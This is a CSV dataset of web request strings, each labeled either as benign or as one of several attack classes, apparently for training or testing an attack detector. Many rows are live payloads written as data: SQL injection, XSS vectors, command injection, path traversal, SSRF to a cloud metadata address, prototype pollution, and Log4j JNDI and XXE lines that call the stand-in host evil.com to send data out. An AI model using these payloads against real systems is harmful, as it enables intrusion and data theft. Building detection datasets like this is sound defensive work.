"payload","label"
"debug=false&token=abcdef&q=test&limit=20&email=bob%40example.com","0"
"..%2Fetc%2Fpasswd","4"
"0x73656c656374","1"
"debug=false&email=bob%40example.com&offset=0","0"
"'; TRUNCATE TABLE users--","1"
"name=Alice","0"
"lang=en","0"
"q=test","0"
"${${lower:jndi}:${lower:rmi}://evil.com/a}","5"
"note=Please call at 3pm - John","0"
"lang=en","0"
"id=7&q=test","0"
"q=what+is+machine+learning","0"
"1 LIMIT 1,1","1"
"token=abcdef","0"
"discount=0.15","0"
"format=json&page=3&email=bob%40example.com&q=test","0"
"category=electronics&brand=Samsung&min_price=100&max_price=500","0"
"/var/log/nginx/access.log","4"
"lang=en&sort=asc","0"
"1 UNION SELECT sysobjects.name, syscolumns.name FROM sysobjects--","1"
"';alert(String.fromCharCode(88,83,83))//';","2"
"token=abcdef&lang=en&category=books","0"
"referrer=https%3A%2F%2Fwww.google.com%2F","0"
"onclick=alert(1)","2"
"1; WAITFOR DELAY '0:0:5'--","1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15","0"
"category=books&name=Alice","0"
"sort=asc&token=abcdef&user=bob&name=Alice","0"
"1;SELECT IF(1=1,SLEEP(5),0)--","1"
"<a href=javascript:alert(1)>click</a>","2"
"username=alice&password=correct-horse-battery-staple","0"
"lang=en","0"
"lang=en&email=bob%40example.com&filter=active&limit=20","0"
"<link rel=stylesheet href=javascript:alert(1)>","2"
"1%27%20OR%20%271%27%3D%271","1"
"name=Alice&id=7&filter=active&sort=asc","0"
"¼script¾alert(1)¼/script¾","2"
"debug=false&filter=active&page=3","0"
"format=json&page=3&category=books&user=bob","0"
"{""action"": ""login"", ""user"": ""alice"", ""timestamp"": 1705000000}","0"
"message=Hi! I'd like to know more about your services.","0"
"{""action"": ""update"", ""fields"": {""name"": ""Bob Smith"", ""email"": ""bob@example.com""}}","0"
"sort=asc&lang=en&format=json&offset=0","0"
"__proto__[admin]=true","5"
"1; SELECT * FROM information_schema.tables","1"
"callback=https%3A%2F%2Fmyapp.com%2Fauth%2Fcallback","0"
"../../../../../etc/passwd","4"
"/api/webhooks/stripe","0"
"sort=asc&page=3","0"
"..%252Fetc%252Fpasswd","4"
"id=7&q=test&email=bob%40example.com","0"
"& cmd /c whoami","3"
"aced0005737200","5"
"format=json&category=books","0"
"bio=I'm a software developer with 5+ years of experience.","0"
"q=test&offset=0&sort=asc&page=3&filter=active","0"
"user=' OR 1=1--","1"
"email=user%40example.com&password=P%40ssw0rd","0"
"/blog/2024/01/my-first-post","0"
"id=7&debug=false&name=Alice&email=bob%40example.com","0"
"q=test&sort=asc&category=books","0"
"q=test&email=bob%40example.com&page=3","0"
"onkeydown=alert(1)","2"
"sort=asc","0"
"debug=false&name=Alice&filter=active&offset=0&category=books","0"
"filter=active&lang=en&offset=0","0"
"offset=0","0"
"<!ENTITY % all '<!ENTITY &#x25; send SYSTEM ""http://evil.com/?%local;"">'>","5"
"lang=en&limit=20&sort=asc&page=3&token=abcdef","0"
"expect://id","4"
"' OR 1=1#","1"
"/.htaccess","4"
"q=test","0"
"/images/logo.png","0"
"format=json","0"
"/etc/httpd/conf/httpd.conf","4"
"0x554e494f4e","1"
"eval('alert(1)')","2"
"/api/v2/orders?status=pending&page=1","0"
"email=bob%40example.com","0"
"token=abcdef&lang=en&filter=active&limit=20&format=json","0"
"; dir","3"
"q=caf%C3%A9+near+me","0"
"onmouseover=alert(1)","2"
"q=' UNION ALL SELECT @@version--","1"
"sort=asc&page=3&q=test","0"
"%2e%2e%5cetc%5cpasswd","4"
"page=3&limit=20","0"
"category=books&filter=active&q=test&page=3&offset=0","0"
"format=xml","0"
"..%5c..%5cetc%5cpasswd","4"
"page=3&offset=0","0"
"user=bob","0"
"http://127.0.0.1:22/","5"
"format=json&user=bob&token=abcdef&sort=asc&limit=20","0"
"debug=false&page=3&user=bob&lang=en&limit=20","0"
"<img src=x:alert(alt) onerror=eval(src) alt=xss>","2"
"user=bob&name=Alice","0"
"<scr ipt>alert(1)</scr ipt>","2"
"offset=0&id=7&category=books&user=bob","0"
"<%73%63%72%69%70%74>alert(1)</%73%63%72%69%70%74>","2"
"; netstat -an","3"
"<img src=x onerror=alert(1)>","2"
"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0","0"
"page=3&sort=asc&user=bob&token=abcdef&q=test","0"
"1 AND SLEEP(5)","1"
"format=json","0"
"/%09/evil.com","5"
"</script><script>alert(1)</script>","2"
"q=test","0"
"%252e%252e%252fetc%252fpasswd","4"
"limit=20&category=books&q=test&page=3","0"
"user=bob&email=bob%40example.com&category=books&offset=0","0"
"' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671))","1"
"<IMG SRC=javascript:alert('XSS')>","2"
"lang=en&page=3","0"
"debug=false&category=books&token=abcdef&email=bob%40example.com&format=json","0"
"1'""><svg/onload=prompt(1)>// OR 1=1--","1"
"http://169.254.169.254/latest/meta-data/","5"
"</textarea><script>alert(1)</script>","2"
"sort=asc&lang=en&id=7&page=3&email=bob%40example.com","0"
